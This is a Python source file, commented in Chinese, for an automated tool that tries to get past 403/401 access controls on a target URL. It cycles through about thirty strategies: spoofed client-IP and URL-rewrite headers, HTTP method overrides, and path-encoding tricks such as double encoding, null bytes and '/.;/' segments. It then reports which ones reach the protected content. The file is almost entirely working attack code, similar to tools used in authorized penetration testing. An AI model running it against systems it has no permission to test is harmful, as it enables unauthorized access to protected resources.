"""403/401 绕过 — 用 Header 欺骗/方法覆盖/路径编码绕过访问控制"""
import re
import time
import urllib.parse
import requests


class ForbiddenBypass:
    """403/401 绕过测试器"""

    # 绕过策略列表
    STRATEGIES = [
        # ── Header 欺骗 ──
        {'name': 'X-Forwarded-For: 127.0.0.1', 'headers': {'X-Forwarded-For': '127.0.0.1'}, 'path_transform': None},
        {'name': 'X-Forwarded-For: localhost', 'headers': {'X-Forwarded-For': 'localhost'}, 'path_transform': None},
        {'name': 'X-Real-IP: 127.0.0.1', 'headers': {'X-Real-IP': '127.0.0.1'}, 'path_transform': None},
        {'name': 'X-Original-URL', 'headers': {'X-Original-URL': '{path}'}, 'path_transform': '/'},
        {'name': 'X-Rewrite-URL', 'headers': {'X-Rewrite-URL': '{path}'}, 'path_transform': '/'},
        {'name': 'X-Custom-IP-Authorization', 'headers': {'X-Custom-IP-Authorization': '127.0.0.1'}, 'path_transform': None},
        {'name': 'Referer: same origin', 'headers': {'Referer': '{base_url}'}, 'path_transform': None},
        {'name': 'X-Host: localhost', 'headers': {'X-Host': 'localhost'}, 'path_transform': None},
        {'name': 'Forwarded: for=127.0.0.1', 'headers': {'Forwarded': 'for=127.0.0.1;proto=http;host=localhost'}, 'path_transform': None},

        # ── HTTP 方法覆盖 ──
        {'name': 'Method: POST', 'method': 'POST', 'headers': {}, 'path_transform': None},
        {'name': 'Method: PUT', 'method': 'PUT', 'headers': {}, 'path_transform': None},
        {'name': 'Method: PATCH', 'method': 'PATCH', 'headers': {}, 'path_transform': None},
        {'name': 'Method: OPTIONS', 'method': 'OPTIONS', 'headers': {}, 'path_transform': None},
        {'name': 'Method: HEAD', 'method': 'HEAD', 'headers': {}, 'path_transform': None},
        {'name': 'TRACE method', 'method': 'TRACE', 'headers': {}, 'path_transform': None},
        {'name': 'X-HTTP-Method-Override: GET', 'headers': {'X-HTTP-Method-Override': 'GET'}, 'path_transform': None},

        # ── 路径编码/变换 ──
        {'name': '尾部斜杠', 'headers': {}, 'path_transform': 'trailing_slash'},
        {'name': '去掉尾部斜杠', 'headers': {}, 'path_transform': 'remove_slash'},
        {'name': '双斜杠', 'headers': {}, 'path_transform': 'double_slash'},
        {'name': '路径点段 /./', 'headers': {}, 'path_transform': 'dot_segment'},
        {'name': 'URL编码尾部 /', 'headers': {}, 'path_transform': 'encode_trailing'},
        {'name': '分号编码', 'headers': {}, 'path_transform': 'semicolon'},
        {'name': '反斜杠替换', 'headers': {}, 'path_transform': 'backslash'},
        {'name': '点+空格后缀', 'headers': {}, 'path_transform': 'dot_space'},
        {'name': '双重URL编码', 'headers': {}, 'path_transform': 'double_encode'},
        {'name': '大小写混合', 'headers': {}, 'path_transform': 'case_mix'},
        {'name': '路径参数注入', 'headers': {}, 'path_transform': 'path_param'},
        {'name': 'Unicode 编码', 'headers': {}, 'path_transform': 'unicode_encode'},
        {'name': 'Null 字节截断', 'headers': {}, 'path_transform': 'null_byte'},
        {'name': '多级目录回溯', 'headers': {}, 'path_transform': 'parent_traversal'},
    ]

    def __init__(self, timeout=8):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
        })
        self._stop_flag = False

    def stop(self):
        self._stop_flag = True

    def scan(self, target_url, progress_callback=None):
        """扫描目标 URL 的 403/401 绕过可能性

        Args:
            target_url: 目标 URL
            progress_callback: (message, pct) 回调

        Returns:
            dict: {'url', 'original_status', 'bypasses': [{'strategy', 'status_code', 'method', 'url', 'headers_used'}]}
        """
        self._stop_flag = False

        # 先获取原始响应
        try:
            orig_resp = self.session.get(target_url, timeout=self.timeout, allow_redirects=False)
            orig_status = orig_resp.status_code
        except Exception as e:
            return {'url': target_url, 'error': str(e), 'original_status': 0, 'bypasses': []}

        # 如果原始响应不是 401/403，提示无需绕过
        if orig_status not in (401, 403, 404, 405, 418, 429, 503):
            return {
                'url': target_url,
                'original_status': orig_status,
                'note': f'原始状态码 {orig_status}，非受限页面，但仍然测试绕过策略',
                'bypasses': [],
            }

        # 提取基础信息
        from urllib.parse import urlparse, urljoin
        parsed = urlparse(target_url)
        base_url = f'{parsed.scheme}://{parsed.netloc}'
        path = parsed.path or '/'
        orig_body_len = len(orig_resp.content)
        orig_body_hash = hash(orig_resp.text[:2000])

        bypasses = []
        total = len(self.STRATEGIES)
        checked = 0

        for strategy in self.STRATEGIES:
            if self._stop_flag:
                break
            checked += 1
            if progress_callback and checked % 3 == 0:
                pct = int(100 * checked / max(total, 1))
                progress_callback(f'测试绕过策略 {checked}/{total}: {strategy["name"]}...', pct)

            try:
                test_url = target_url
                method = strategy.get('method', 'GET')
                headers = {}

                # 构建 headers
                for k, v in strategy.get('headers', {}).items():
                    headers[k] = v.replace('{path}', path).replace('{base_url}', base_url)

                # 路径变换
                transform = strategy.get('path_transform')
                if transform and transform is not None:
                    test_url = self._transform_url(target_url, transform)
                    if not test_url:
                        continue

                # 发送请求
                resp = self.session.request(method, test_url, headers=headers,
                                            timeout=self.timeout, allow_redirects=False)

                # 判断是否绕过成功
                if self._is_bypassed(orig_status, orig_body_len, orig_body_hash, resp):
                    bypasses.append({
                        'strategy': strategy['name'],
                        'status_code': resp.status_code,
                        'method': method,
                        'url': test_url,
                        'headers_used': headers if headers else {},
                        'body_size': len(resp.content),
                    })

            except Exception:
                continue

        if progress_callback:
            progress_callback(f'403绕过测试完成: 发现 {len(bypasses)} 个可行策略', 100)

        return {
            'url': target_url,
            'original_status': orig_status,
            'original_body_size': orig_body_len,
            'bypasses': bypasses,
        }

    def _is_bypassed(self, orig_status, orig_body_len, orig_body_hash, resp):
        """判断绕过是否成功"""
        # 状态码从 403/401 变为 200/2xx/3xx
        if resp.status_code in (200, 201, 202, 204, 301, 302, 304):
            # 额外验证：响应内容不能和 403 页完全一样
            if resp.status_code == 200:
                body_hash = hash(resp.text[:2000])
                if body_hash == orig_body_hash and len(resp.content) == orig_body_len:
                    return False
            return True
        # 状态码从 403 变为 401（至少暴露了认证方式）
        if orig_status == 403 and resp.status_code == 401:
            return False  # 不算真正的绕过
        return False

    @staticmethod
    def _transform_url(url, transform):
        """对 URL 路径进行变换"""
        from urllib.parse import urlparse, urlunparse
        parsed = urlparse(url)
        path = parsed.path or '/'

        if transform == 'trailing_slash':
            if not path.endswith('/'):
                path = path + '/'
        elif transform == 'remove_slash':
            path = path.rstrip('/')
        elif transform == 'double_slash':
            path = path.replace('//', '/')  # normalize first
            parts = path.split('/')
            if len(parts) > 1:
                path = '/'.join(parts[:-1]) + '//' + parts[-1]
            else:
                path = path + '/'
        elif transform == 'dot_segment':
            parts = path.rsplit('/', 1)
            if len(parts) == 2:
                path = parts[0] + '/./' + parts[1]
            else:
                path = '/./' + path.lstrip('/')
        elif transform == 'encode_trailing':
            path = path.rstrip('/') + '%2f'
        elif transform == 'semicolon':
            parts = path.split('/')
            if len(parts) > 1:
                parts[-2] = parts[-2] + ';'
                path = '/'.join(parts)
        elif transform == 'backslash':
            path = path.replace('/', '\\')
        elif transform == 'dot_space':
            path = path.rstrip('/') + '. '
        elif transform == 'double_encode':
            path = urllib.parse.quote(path, safe='/')
        elif transform == 'case_mix':
            path = ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(path))
        elif transform == 'path_param':
            parts = path.split('/')
            if len(parts) > 1:
                parts[-2] = parts[-2] + '/.;/'
                path = '/'.join(parts)
        elif transform == 'unicode_encode':
            path = path.replace('a', '%61').replace('e', '%65')
        elif transform == 'null_byte':
            path = path.rstrip('/') + '%00'
        elif transform == 'parent_traversal':
            parts = path.rsplit('/', 1)
            if len(parts) == 2:
                path = parts[0] + '/../' + parts[1]
        else:
            return url

        return urlunparse((parsed.scheme, parsed.netloc, path, parsed.params, parsed.query, parsed.fragment))
